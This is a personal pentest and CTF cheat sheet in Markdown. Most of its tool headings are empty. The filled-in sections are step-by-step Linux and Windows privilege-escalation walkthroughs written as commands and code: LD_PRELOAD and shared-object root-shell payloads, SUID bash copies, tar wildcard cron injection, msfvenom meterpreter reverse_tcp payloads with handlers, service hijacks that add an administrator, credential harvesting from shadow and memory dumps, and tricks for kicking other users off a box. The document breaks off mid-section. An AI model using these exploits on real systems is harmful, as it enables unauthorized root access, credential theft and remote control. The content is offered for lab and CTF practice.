
# Suljov-Pentest-ctf-cheat-sheet

My personal notes for easy use and to remember things
# Table of content 

- [one tricks/others](#one-tricksothers)
  - [looking for root permissions](#looking-for-root-permissions)
  - [using chattr](#using-chattr)
  - [fixing the vulnerability in /etc/sudoers, for example](#fixing-the-vulnerability-in-etcsudoers-for-example)
  - [finding flags](#finding-flags)
  - [full tty shell](#full-tty-shell)
  - [how to see who is logged into the system](#how-to-see-who-is-logged-into-the-system)
  - [killing session of a user logged into ssh/system](#killing-session-of-a-user-logged-into-sshsystem)
  - [changing ssh user password](#changing-ssh-user-password)
  - [defending box](#defending-box)
  - [python http server](#python-http-server)
  - [python smb server](#python-smb-server)
  - [Remove user from sudoers](#Remove-user-from-sudoers)

- [remote control](#remote-control)
  - [remmina](#remmina)
  - [xfreerdp](#xfreerdp)

- [Free C2 Frameworks](#Free-C2-Frameworks)
  - [Metasploit](#Metasploit)
  - [Armitage](#Armitage)
  - [Powershell Empire plus Starkiller](#Powershell-Empire-plus-Starkiller)
  - [Covenant](#Covenant)
  - [Sliver](#Sliver)

- [Paid C2 Frameworks](#Paid-C2-Frameworks)
  - [Cobalt Strike](#Cobalt-Strike)
  - [Brute Ratel](#Brute-Ratel)


- [multi tools](#multi-tools)
  - [autorecon](#autorecon)
  - [fsociety](#fsociety)
  - [Social-Engineer Toolkit (SET)](social-engineer-toolkit-set)
  - [tool-x](#tool-x)
 

- [Scanning](#Scanning)
  - [nmap scanning](#nmap-scanning)
  - [nikto scanning](#nikto-scanning)
  - [gobuster](#gobuster)
  - [dirsearch](#dirsearch)
  - [netdiscover](#netdiscover)
  - [Genereating Wordlist from the Website](#genereating-wordlist-from-the-website)
  - [enum4linux](#enum4linux)
  - [snmpenum](#snmpenum)
  - [snmpwalk](#snmpwalk)
  - [rustscan](#rustscan)
  - [wpscan](#wpscan)
  - [DSSS](#DSSS)
  - [ffuf](#ffuf)
  - [wfuzz](#wfuzz)
  - [gittools](#gittools)
  - [smbmap](#smbmap)
  - [smbclient](#smbclient)
  - [crackmapexec](#crackmapexec)
  - [nbtscan](#nbtscan)
  - [sublist3r](#sublist3r)
  - [anubis](#anubis)
  - [amass](#amass)
  - [dnsrecon](#dnsrecon)
  - [nmblookup](#nmblookup)
  - [rpcclient](#rpcclient)
  - [evil-winrm](#evil-winrm)
  - [responder](#responder)
  - [certgraph](#certgraph)
  - [whois](#whois)
  - [nslookup](#nslookup)
  - [dig](#dig)


- [reverse shells](#reverse-shells)
  - [pentest monkey](#pentest-monkey)
  - [php webbshell](#php-webbshell)
  - [reverse shells](#reverse-shells)
  - 


- [Metasploit](#Metasploit)
  - [msfconsole](#msfconsole)
  - [searchsploit](#searchsploit)
  - [msfvenom](#msfvenom)
  - [payloads](#payloads)
  - [](#)


- [brute force](#brute-force)
  - [hydra](#hydra)
  - [burp suite](#burp-suite)
  - [zap](#zap)
  - [](#)
 

- [Linux Privilige Escalation](#Linux-Privilige-Escalation)
  - [basic](#basic)
  - [Linpeas](#Linpeas)
  - [Kernel Exploits](#Kernel-Exploits)
  - [Stored Passwords (Config Files)](#Stored-Passwords-Config-Files)
  - [Stored Passwords (History)](#Stored-Passwords-History)
  - [Weak File Permissions](#Weak-File-Permissions)
  - [SSH Keys](#SSH-Keys)
  - [Sudo (Shell Escaping)](#Sudo-Shell-Escaping)
  - [Sudo (Abusing Intended Functionality)](#Sudo-Abusing-Intended-Functionality)
  - [Sudo (LD_PRELOAD)](#Sudo-LD_PRELOAD)
  - [SUID (Shared Object Injection)](#SUID-Shared-Object-Injection)
  - [SUID (Symlinks)](#SUID-Symlinks)
  - [SUID (Environment Variables #1)](#SUID-Environment-Variables-1)
  - [SUID (Environment Variables #2)](#SUID-Environment-Variables-2)
  - [Cron (Path)](#Cron-Path)
  - [Capabilities](#Capabilities)
  - [Cron (Wildcards)](#Cron-Wildcards)
  - [Cron (File Overwrite)](#Cron-File-Overwrite)
  - [NFS Root Squashing](#NFS-Root-Squashing)


- [Windows Privilige Escalation](#Linux-Privilige-Escalation)
 

- [cryptografy and cracking plus Steganography etc](#cryptografy-and-cracking-plus-Steganography-etc)
  - [hash identifying](#hash-identifying)
  - [hash cracker](#hash-cracker)
  - [john the ripper](#john-the-ripper)
  - [ssh2john](#ssh2john)
  - [hashcat](#hashcat)
  - [zip2john](#zip2john)

- [linux backdoors](#linux-backdoors)
  - [ssh backdoor](#ssh-backdoor)
  - [php backdoor ](#php-backdoor )
  - [cronjob backdoor](#cronjob-backdoor)
  - [bashrc backdoor](#bashrc-backdoor)
  - [pam-unix-so backdoor](#pam-unix-so-backdoor)


- [Buffer overflow](#Buffer-overflow)
  - [fuzzing script](#fuzzing-script)
  - [payload script](#payload-script)
  - [mona commands](#mona-commands)


- [web hacking](#web-hacking)
  - [SQL injection](#SQL-injection)
  - [sqlmap](#sqlmap)
  - [RFI/LFI](#RFILFI)

- [Phishing](#Phishing)
  - [GoPhish](#GoPhish)
  - [zphisher](#zphisher)
  - [SocialFish](#SocialFish)
  - [](#)

- [Reverse engineering](#Reverse-engineering)
  - [tools](#tools)
  - [file](#file)
  - [strings](#strings)
  - [radare2](#radare2)'
  - [ghidra](#ghidra)
  - [immunity debugger](#immunity-debugger)
  - [xxd](#xxd)
  - [readelf](#readelf)
  - [objdump](#objdump)



 

# one tricks/others

### looking for root permissions

* you can use find to search for permissions with root

```
find / -type f \( -perm -4000 -o -perm -2000 \) -print
```
* Find SUID privescs using the following commands:
```
find / -perm -u=s -type f 2>/dev/null
```

* Find SGID privescs using the following commands:
```
find / -perm -g=s -type f 2>/dev/null
```



### using chattr

* you can use this to make the file immutable and therefore keep your name in this file.
* if the box dont have chattr you can simply install chattr or download chattr binary or busybox binary 

Add the immutability bit:
```
chattr +i /root/king.txt
```

Remove the immutability bit:
```
chattr -i /root/king.txt
```

Remove chattr:
```
which chattr # Get chattr's path, default: /usr/bin/chattr
```

```
rm usr/bin/chattr # Or another path if different
```



### fixing the vulnerability in /etc/sudoers, for example

```
# User privilege specification
root ALL=(ALL=ALL) ALL
teste ALL=(root) SETENV:NOPASSWD: /usr/bin/git *, /usr/bin/chattr
test1 ALL=(root) NOPASSWD: /bin/su test1, /usr/bin/chattr
```

* here you can see that user teste and teste1 has root permission on the git and su binary, to fix this just remove everything from the teste and teste1 there

```
root ALL=(ALL=ALL) ALL
```

* and it will be like that, so there will be no way to climb privilege by su and git

### finding flags

## using find

* you can use find to look for flags

```
find / -name flag.txt 2>/dev/null
find / -name user.txt 2>/dev/null
find / -name .flag 2>/dev/null
find / -name flag 2>/dev/null
find / -name root.txt 2>/dev/null
```

## using grep

ops this one is for when the directory you are in at the momoent
```
grep -ri thm{ 2>/dev/null
```

### full tty shell

* tweaking your shell, if you get a reverse shell and you ctrl + c and your shell closes/stops, this will help you and you can edit, give ctrl + c at will

```
python3 -c 'import pty; pty.spawn("/bin/sh")'
export TERM=xterm
Ctrl + z
stty raw -echo;fg
```
* for you to know which pts (pseudo slave terminal) the user is connected, just use the following command in the terminal: w , then just see which pts the user is and use the command

* extra: this works sometimes too 

```
/usr/bin/script -qc /bin/bash /dev/null
export TERM=xterm
Ctrl + z
stty raw -echo;fg
```

## how to see who is logged into the system

* you can use the following commands to see who is logged into ssh/system

```
w
who
ps aux | grep pts
```

## killing session of a user logged into ssh/system

* to kill someone's session just use the following command
manual:
```
pkill -9 -t pts/1
```
## kicking all users connected in ssh
```
kill `ps aux|grep pts| awk '{print $2}'`;
```

## kicking all people connected to a given user on ssh 
```
pkill -9 -U <name> 
```


* as explained in some examples above, just put the pts of the user you want to remove from the machine

### changing ssh user password

* to change a user's password just use the following command

```
passwd [UserName]
```

* you can change ssh keys



### defending box

* Look for common ways to fix a box, for example: changing ssh keys, changing passwords, look for running processes or even in cronjobs

* Always set your persistence so that even if someone kicks you out, you have multiple ways to get back.

* So start fixing things in the box. Fix security issues, not legitimate services. For example, disabling ssh is NOT allowed unless it is an intentionally broken ssh installation.

## python http server

```
python3 -m http.server <port>
```

## python smb server
```
sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
```
 
## Remove user from sudoers
```
nano /etc/sudoers
```

or alternative
```
visudo
```


# remote control

### remmina 

easy to use just write 
```
sudo apt install remmina 
```
then open it and put in all the credentials it ask for and press connect 

### xfreerdp

easy to use just write

example
```
xfreerdp /v:<ip> /cert:ignore /u:<username> /p:<password>
```
v = ip
u = username 
p = password

# Free C2 Frameworks

### Metasploit

### Armitage

### Powershell Empire plus Starkiller

### Covenant

Sliver

# Paid C2 Frameworks

### Cobalt Strike

### Brute Ratel

# multi tools 

### autorecon

### fsociety

### tool-x

### Social-Engineer Toolkit (SET)

# Scanning 

### nmap scanning

### nikto scanning 

### gobuster

### dirsearch

### netdiscover 

### Genereating Wordlist from the Website 

### enum4linux

### snmpenum 

### snmpwalk

### rustscan

### wpscan

### DSSS 

### ffuf

### wfuzz

### gittools

### smbmap

### smbclient

### crackmapexec

### nbtscan

### sublist3r

### anubis

### amass

### dnsrecon

### nmblookup

### rpcclient 

### evil-winrm

# reverse shells

### pentest-monkey

### php webbshell

### reverse shells 

### responder

# Metasploit

### msfconsole

### searchsploit

### msfvenom

### payloads

# brute force

### hydra

### burp suite

### zap

### certgraph

### whois

### nslookup

### dig

# Linux Privilige Escalation

### basic

Use the command: 
```
sudo -l
```
to see if you can use any sudo commands. 

if yes you can use websites like 
```
https://gtfobins.github.io/
```
to see if you can use anything from there to get a privilige escalation to root 


### Linpeas 
very simple. if you can go to a folder (tips is the tmp folder) 

and send the "linpeas.sh" file. 

example command is: 
```
wget http://<ip>:<port>/<path or just tha name of the file> 
```
then use the next command on the file: 
```
chmod +x linpeas.sh
```

then you can execute the file: 
```
./linpeas.sh 
```
and then see if you can find anything to get a privilige escalation


### Kernel Exploits 

#### Detection

##### Linux VM

1. In command prompt type:
```
<path to the file>/linux-exploit-suggester.sh
```
or if your in the folder with the file just type:
```
./linux-exploit-suggester.sh
```
2. From the output, notice that the OS is vulnerable to “dirtycow”.

#### Exploitation

##### Linux VM

1. In command prompt type:
```
gcc -pthread <path to the file>/c0w.c -o c0w
```
2. In command prompt type: 
```
4. ./c0w
```

Disclaimer: This part takes 1-2 minutes - Please allow it some time to work.

3. In command prompt type: 
```
passwd
```
6. In command prompt type: 
```
8. id
```


### Stored Passwords (Config Files) 


1. In command prompt type:
``` 
cat /home/user/myvpn.ovpn
```
2. From the output, make note of the value of the “auth-user-pass” directive.
3. In command prompt type: 
``` 
cat /etc/openvpn/auth.txt
```
4. From the output, make note of the clear-text credentials.
5. In command prompt type: 
``` 
cat /home/user/.irssi/config | grep -i passw
```
6. From the output, make note of the clear-text credentials.

### Stored Passwords (History)

#### Exploitation

Linux VM
1. In command prompt type:
```
cat ~/.bash_history | grep -i passw
```
2. From the output, make note of the clear-text credentials.

### Weak File Permissions

####Detection

##### Linux VM

1. In command prompt type:
```
ls -la /etc/shadow
```
2. Note the file permissions

#### Exploitation

##### Linux VM

1. In command prompt type: 
```
cat /etc/passwd
```
3. Save the output to a file on your attacker machine
4. In command prompt type: 
```
cat /etc/shadow
```
6. Save the output to a file on your attacker machine

Attacker VM

1. In command prompt type: 
```
unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt
```

Now, you have an unshadowed file.  We already know the password, but you can use your favorite hash cracking tool to crack dem hashes.  For example:
```
hashcat -m 1800 unshadowed.txt rockyou.txt -O
```
### SSH Keys

#### Detection

##### Linux VM

1. In command prompt type:
```
find / -name authorized_keys 2> /dev/null
```
2. In a command prompt type:
```
find / -name id_rsa 2> /dev/null
```
3. Note the results.

#### Exploitation

##### Linux VM

1. Copy the contents of the discovered id_rsa file to a file on your attacker VM.

Attacker VM

1. In command prompt type: 
```
chmod 400 id_rsa
```
3. In command prompt type: 
```
ssh -i id_rsa root@<ip>
```
You should now have a root shell :)

### Sudo (Shell Escaping) 


#### Detection

##### Linux VM

1. In command prompt type: 
```
sudo -l
```
3. From the output, notice the list of programs that can run via sudo.

#### Exploitation

##### Linux VM

1. In command prompt type any of the following:
a.
```
sudo find /bin -name <the command your allowed example nano> -exec /bin/sh \;
```
b. 
```
sudo awk 'BEGIN {system("/bin/sh")}'
```
c. 
```
echo "os.execute('/bin/sh')" > shell.nse && sudo <second command your allowd example nmap> --script=shell.nse
```
```
d. sudo vim -c '!sh'
```
### Sudo (Abusing Intended Functionality)


#### Detection

##### Linux VM

1. In command prompt type: 
```
sudo -l
```
3. From the output, notice the list of programs that can run via sudo.

#### Exploitation

##### Linux VM

1. In command prompt type:
```
sudo <command your allowed example apache2> -f /etc/shadow
```
2. From the output, copy the root hash.

##### Attacker VM

1. Open command prompt and type:
```
echo '[Pasted Root Hash]' > hash.txt
```
2. In command prompt type:
```
john --wordlist=/usr/share/wordlists/nmap.lst hash.txt
```
3. From the output, notice the cracked credentials.

### Sudo (LD_PRELOAD)


#### Detection

##### Linux VM

1. In command prompt type: 
```
sudo -l
```
3. From the output, notice that the LD_PRELOAD environment variable is intact.

#### Exploitation

1. Open a text editor and type:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
2. Save the file as x.c
3. In command prompt type:
```
gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
```
4. In command prompt type:
```
sudo LD_PRELOAD=/tmp/x.so apache2
```
5. In command prompt type: 
```
id
```

### SUID (Shared Object Injection) 


#### Detection

##### Linux VM

1. In command prompt type: find / -type f -perm -04000 -ls 2>/dev/null
2. From the output, make note of all the SUID binaries.
3. In command line type:
```
strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"
```
4. From the output, notice that a .so file is missing from a writable directory.

#### Exploitation

##### Linux VM

5. In command prompt type: 
```
mkdir /home/user/.config
```
6. In command prompt type: 
```
cd /home/user/.config
```
7. Open a text editor and type:
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
8. Save the file as libcalc.c
9. In command prompt type:
```
gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c
```
10. In command prompt type: 
```
/usr/local/bin/suid-so
```
11. In command prompt type: 
```
id
```

 ### SUID (Symlinks) 


#### Detection

##### Linux VM

1. In command prompt type: 
```
dpkg -l | grep nginx
```
2. From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3.

Exploitation

Linux VM – Terminal 1

1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: 
```
su root
```
2. The root password is password123
3. Once escalated to root, in command prompt type: 
``` 
su -l www-data
```
4. In command prompt type: 
```
/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log
```
5. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.

Linux VM – Terminal 2

1. Once logged in, type: 
``` 
su root
```
2. The root password is password123
3. As root, type the following: 
```
invoke-rc.d nginx rotate >/dev/null 2>&1
```
4. Switch back to the previous terminal.

Linux VM – Terminal 1

1. From the output, notice that the exploit continued its execution.
2. In command prompt type: 
``` 
id
```

### SUID Environment Variables 1 

#### Detection

##### Linux VM

1. In command prompt type: 
``` 
find / -type f -perm -04000 -ls 2>/dev/null
```
2. From the output, make note of all the SUID binaries.
3. In command prompt type: strings /usr/local/bin/suid-env
4. From the output, notice the functions used by the binary.

Exploitation

Linux VM

1. In command prompt type:
```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
```
2. In command prompt type: 
```
gcc /tmp/service.c -o /tmp/service
```
3. In command prompt type: 
```
export PATH=/tmp:$PATH
```
4. In command prompt type: 
```
/usr/local/bin/suid-env
```
5. In command prompt type: 
```
id
```


### SUID Environment Variables 2 


#### Detection

##### Linux VM

1. In command prompt type: 
```
find / -type f -perm -04000 -ls 2>/dev/null
```
2. From the output, make note of all the SUID binaries.

3. In command prompt type: 
```
strings /usr/local/bin/suid-env2
```
4. From the output, notice the functions used by the binary.

### Exploitation Method #1

##### Linux VM

1. In command prompt type:
```
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
```
2. In command prompt type:
```
export -f /usr/sbin/service
```
3. In command prompt type: /usr/local/bin/suid-env2

### Exploitation Method #2

##### Linux VM

1. In command prompt type:
```
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'
```

### Capabilities


#### Detection

##### Linux VM

1. In command prompt type: 
``` 
getcap -r / 2>/dev/null
```
2. From the output, notice the value of the “cap_setuid” capability.

Exploitation

Linux VM

1. In command prompt type:
```
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
2. Enjoy root!

### Cron (Path) 

#### Detection

##### Linux VM

1. In command prompt type: 
```
cat /etc/crontab
```
2. From the output, notice the value of the “PATH” variable.

#### Exploitation

##### Linux VM

1. In command prompt type:
```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
```
2. In command prompt type: 
```
chmod +x /home/user/overwrite.sh
```
3. Wait 1 minute for the Bash script to execute.
4. In command prompt type: 
```
/tmp/bash -p
```
5. In command prompt type: 
```
id
```

### Cron (Wildcards)


#### Detection

##### Linux VM

1. In command prompt type: 
```
cat /etc/crontab
```
2. From the output, notice the script “/usr/local/bin/compress.sh”

3. In command prompt type: 
```
cat /usr/local/bin/compress.sh
```
4. From the output, notice the wildcard (*) used by ‘tar’.

#### Exploitation

##### Linux VM

1. In command prompt type:
```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh
```
```
touch /home/user/--checkpoint=1
```
```
touch /home/user/--checkpoint-action=exec=sh\ runme.sh
```
4. Wait 1 minute for the Bash script to execute.
5. In command prompt type: 
```
/tmp/bash -p
```
6. In command prompt type: 
```
id
```

### Cron (File Overwrite)

#### Detection

##### Linux VM

1. In command prompt type: 
```
cat /etc/crontab
```
2. From the output, notice the script “overwrite.sh”
3. In command prompt type: 
```
ls -l /usr/local/bin/overwrite.sh
```
4. From the output, notice the file permissions.

#### Exploitation

##### Linux VM

1. In command prompt type:
```
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
```
2. Wait 1 minute for the Bash script to execute.
3. In command prompt type: 
```
/tmp/bash -p
```
4. In command prompt type: 
```
id
```

### NFS Root Squashing

#### Detection

##### Linux VM

1. In command line type: 
```
cat /etc/exports
```
2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.

#### Exploitation

##### Attacker VM

1. Open command prompt and type: 
```
showmount -e 10.10.241.104
```
2. In command prompt type: 
```
mkdir /tmp/1
```
3. In command prompt type: mount 
```
-o rw,vers=2 10.10.241.104:/tmp /tmp/1
```
In command prompt type:
```
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
```
4. In command prompt type: 
```
gcc /tmp/1/x.c -o /tmp/1/x
```
5. In command prompt type: 
```
chmod +s /tmp/1/x
```
##### Linux VM

1. In command prompt type: 
```
/tmp/x
```
2. In command prompt type: 
```
id
```

# Windiws Privilige Escalation

ops: some of these attacks are via RDP

### Registry Escalation - Autorun 

#### Detection

##### Windows VM

1. Open command prompt and type: 
```
C:\<the path to the file>\Autoruns64.exe
```
2. In Autoruns, click on the ‘Logon’ tab.
3. From the listed results, notice that the “My Program” entry is pointing to “C:\Program Files\Autorun Program\program.exe”.
4. In command prompt type: 
```
C:\<path to the file>\accesschk64.exe -wvu "C:\Program Files\Autorun Program"
```
5. From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.


#### Exploitation

##### Kali VM

1. Open command prompt and type: 
```
msfconsole
```
2. In Metasploit (msf > prompt) type: 
```
use multi/handler
```
3. In Metasploit (msf > prompt) type: 
```
set payload windows/meterpreter/reverse_tcp
```
4. In Metasploit (msf > prompt) type: 
```
set lhost [Kali VM IP Address]
```
5. In Metasploit (msf > prompt) type: 
```
run
```
6. Open an additional command prompt and type: 
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe -o program.exe
```
7. Copy the generated file, program.exe, to the Windows VM.

##### Windows VM

1. Place program.exe in ‘C:\Program Files\Autorun Program’.
2. To simulate the privilege escalation effect, logoff and then log back on as an administrator user.

Kali VM

1. Wait for a new session to open in Metasploit.
2. In Metasploit (msf > prompt) type: 
```
sessions -i [Session ID]
```
3. To confirm that the attack succeeded, in Metasploit (msf > prompt) type: 
```
getuid
```

### Registry Escalation - AlwaysInstallElevated 

#### Detection

##### Windows VM

1.Open command prompt and type: 
```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
```
2.From the output, notice that “AlwaysInstallElevated” value is 1.
3.In command prompt type: 
```
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```
4.From the output, notice that “AlwaysInstallElevated” value is 1.

Exploitation

Kali VM

1. Open command prompt and type: 
```
msfconsole
```
2. In Metasploit (msf > prompt) type: 
```
use multi/handler
```
3. In Metasploit (msf > prompt) type: 
```
set payload windows/meterpreter/reverse_tcp
```
4. In Metasploit (msf > prompt) type: 
```
set lhost [Kali VM IP Address]
```
5. In Metasploit (msf > prompt) type: 
```
run
```
6. Open an additional command prompt and type: 
```
msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi
```
8. Copy the generated file, setup.msi, to the Windows VM.

Windows VM

1.Place ‘setup.msi’ in ‘C:\Temp’.
2.Open command prompt and type: 
```
msiexec /quiet /qn /i C:\Temp\setup.msi
```
Enjoy your shell! :)


### Service Escalation - Registry

#### Detection

##### Windows VM

1. Open powershell prompt and type: Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
2. Notice that the output suggests that user belong to “NT AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry key.

#### Exploitation

##### Windows VM

1. Copy ‘C:<the path to the file>\windows_service.c’ to the Kali VM.

Kali VM

1. Open windows_service.c in a text editor and replace the command used by the system() function to: 
```
cmd.exe /k net localgroup administrators user /add
```
2. Exit the text editor and compile the file by typing the following in the command prompt: 
```
x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64') 
```
3. Copy the generated file x.exe, to the Windows VM.

Windows VM

1. Place x.exe in ‘C:\Temp’.
2. Open command prompt at type: 
```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
```
3. In the command prompt type: 
```
sc start regsvc
```
4. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt:
```
net localgroup administrators
```

### Service Escalation - Executable Files
  
#### Detection

##### Windows VM

1. Open command prompt and type: 
```
C:<the path to the file>\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
```
2. Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file.

#### Exploitation

##### Windows VM

1. Open command prompt and type: 
```
copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
```
2. In command prompt type: 
```
sc start filepermsvc
```
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: 
```
net localgroup administrators
```
  
### Privilege Escalation - Startup Applications 
  
#### Detection

##### Windows VM

1. Open command prompt and type: 
```
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```
2. From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory.

#### Exploitation

##### Kali VM

1. Open command prompt and type: 
``` 
msfconsole
```
2. In Metasploit (msf > prompt) type: 

```
use multi/handler
```
3. In Metasploit (msf > prompt) type: 
```  
set payload windows/meterpreter/reverse_tcp
```
4. In Metasploit (msf > prompt) type: 
```
set lhost [Kali VM IP Address]
```
5. In Metasploit (msf > prompt) type: 
```  
run
```
6. Open another command prompt and type: 
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o x.exe
```
7. Copy the generated file, x.exe, to the Windows VM.

##### Windows VM

1. Place x.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.
2. Logoff.
3. Login with the administrator account credentials.

##### Kali VM

1. Wait for a session to be created, it may take a few seconds.
2. In Meterpreter(meterpreter > prompt) type: 
```  
getuid
```
3. From the output, notice the user is “User-PC\Admin”

### Service Escalation - DLL Hijacking 


#### Detection

##### Windows VM

1. Open the Tools folder that is located on the desktop and then go the Process Monitor folder.
2. In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on Procmon.exe and select ‘Run as administrator’ from the menu.
3. In procmon, select "filter".  From the left-most drop down menu, select ‘Process Name’.

4. In the input box on the same line type: 
```
dllhijackservice.exe
```
5. Make sure the line reads “Process Name is dllhijackservice.exe then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
6. Next, select from the left-most drop down menu ‘Result’.
7. In the input box on the same line type: 
```
NAME NOT FOUND
```
8. Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
9. Open command prompt and type: 
```  
sc start dllsvc
```
10. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute ‘C:\Temp\hijackme.dll’ yet it could not do that as the file was not found. Note that ‘C:\Temp’ is a writable location.

#### Exploitation

##### Windows VM

1. Copy ‘C:\<path to the file>\windows_dll.c’ to the Kali VM.

Kali VM

1. Open windows_dll.c in a text editor and replace the command used by the system() function to: 
```  
cmd.exe /k net localgroup administrators user /add
```
2. Exit the text editor and compile the file by typing the following in the command prompt: 
```
x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
```
3. Copy the generated file hijackme.dll, to the Windows VM.

Windows VM

1. Place hijackme.dll in ‘C:\Temp’.
2. Open command prompt and type: 
  ```
sc stop dllsvc & sc start dllsvc
```
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators

  
### Service Escalation - binPath 


#### Detection

##### Windows VM

1. Open command prompt and type: 
```
C:\<tha path to the file>\accesschk64.exe -wuvc daclsvc
```
2. Notice that the output suggests that the user “User-PC\User” has the “SERVICE_CHANGE_CONFIG” permission.

Exploitation

Windows VM

1. In command prompt type: 
```  
sc config daclsvc binpath= "net localgroup administrators user /add"
```
2. In command prompt type: sc start daclsvc
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: 
```
net localgroup administrators
```
  
### Service Escalation - Unquoted Service Paths 

#### Detection

##### Windows VM

1. Open command prompt and type: 
```
sc qc unquotedsvc
```
2. Notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes.

Exploitation

Kali VM

1. Open command prompt and type: 
```
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
```
2. Copy the generated file, common.exe, to the Windows VM.

Windows VM

1. Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
2. Open command prompt and type: 
```
sc start unquotedsvc
```
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators  
 
### Potato Escalation - Hot Potato
  

#### Exploitation

##### Windows VM

1. In command prompt type: 
  ```
powershell.exe -nop -ep bypass
```

2. In Power Shell prompt type: 
```  
Import-Module C:\<path to the file>\Tater.ps1
```

3. In Power Shell prompt type: 
```  
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
```
4. To confirm that the attack was successful, in Power Shell prompt type: 
```  
net localgroup administrators
```
  
### Password Mining Escalation - Configuration Files
  

#### Exploitation

##### Windows VM

1. Open command prompt and type: 
  ```
notepad C:\Windows\Panther\Unattend.xml
```
2. Scroll down to the “<Password>” property and copy the base64 string that is confined between the “<Value>” tags underneath it.

Kali VM

1. In a terminal, type: 
```  
echo [copied base64] | base64 -d
```
2. Notice the cleartext password

### Password Mining Escalation - Memory 
  
#### Exploitation

##### Kali VM

1.Open command prompt and type: 
```  
msfconsole
```
2.In Metasploit (msf > prompt) type: 
```  
use auxiliary/server/capture/http_basic
```
3.In Metasploit (msf > prompt) type: 
```  
set uripath x
```
4.In Metasploit (msf > prompt) type: 
```  
run
```
Windows VM

1.Open Internet Explorer and browse to: 
```  
http://[Kali VM IP Address]/x
```
2.Open command prompt and type: 
```  
taskmgr
```
3.In Windows Task Manager, right-click on the “iexplore.exe” in the “Image Name” columnand select “Create Dump File” from the popup menu.
4.Copy the generated file, iexplore.DMP, to the Kali VM.

Kali VM

1.Place ‘iexplore.DMP’ on the desktop.
2.Open command prompt and type: 
```  
strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"
```
3.Select the Copy the Base64 encoded string.
4.In command prompt type: 
```  
echo -ne [Base64 String] | base64 -d
```
5.Notice the credentials in the output.

### Privilege Escalation - Kernel Exploits 
  
#### Establish a shell

##### Kali VM

1. Open command prompt and type: 
```  
msfconsole
```
2. In Metasploit (msf > prompt) type: 
```  
use multi/handler
```
3. In Metasploit (msf > prompt) type: 
``` 
set payload windows/meterpreter/reverse_tcp
```
4. In Metasploit (msf > prompt) type: 
```  
set lhost [Kali VM IP Address]
```
5. In Metasploit (msf > prompt) type:
```
run
```
6. Open an additional command prompt and type: 
```  
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe > shell.exe
```
7. Copy the generated file, shell.exe, to the Windows VM.

#### Windows VM

1. Execute shell.exe and obtain reverse shell

#### Detection & Exploitation

##### Kali VM

